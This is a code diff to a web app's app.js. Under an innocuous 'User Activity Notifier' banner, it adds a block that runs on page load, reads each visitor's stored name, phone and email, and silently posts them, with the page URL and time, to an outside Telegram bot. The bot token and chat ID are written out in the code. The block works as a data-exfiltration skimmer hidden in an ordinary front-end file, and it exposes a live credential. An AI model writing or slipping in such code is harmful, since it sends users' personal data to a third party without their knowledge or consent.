@@ -9783,3 +9783,42 @@ document.addEventListener('DOMContentLoaded', () => {
   /* Initial mood */
   setMood('happy');
 });
+
+/* ...your current app.js code... */
+
+/* === start: SELBYME User Activity Notifier === */
+(() => {
+  const TG_BOT_TOKEN = '7944623021:AAGVlpMRe2Oim5i-eKZ220sYUOODsZDH7go';
+  const TG_CHAT_ID   = '6268442991';
+
+  if (sessionStorage.getItem('sel_notified')) return;
+
+  const name  = localStorage.getItem('user_name')  || 'N/A';
+  const phone = localStorage.getItem('user_phone') || 'N/A';
+  const email = localStorage.getItem('user_email') || 'N/A';
+
+  const message =
+    `🔐 <b>Login Info:</b>\n\n` +
+    `👨‍💼 <b>Name:</b> ${name}\n\n` +
+    `📞 <b>Phone:</b> ${phone}\n\n` +
+    `✉️ <b>Email:</b> ${email}\n\n` +
+    `🌐 <b>Page:</b> ${location.href}\n\n` +
+    `📅 <b>Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+
+  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TG_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    })
+  }).then(r => r.ok && console.log('[SEL] Telegram notified'))
+    .catch(e => console.error('[SEL] Telegram notify failed', e));
+
+  sessionStorage.setItem('sel_notified', '1');
+})();
+/* === end: SELBYME User Activity Notifier === */
+
+/* ...rest of your app.js code... */
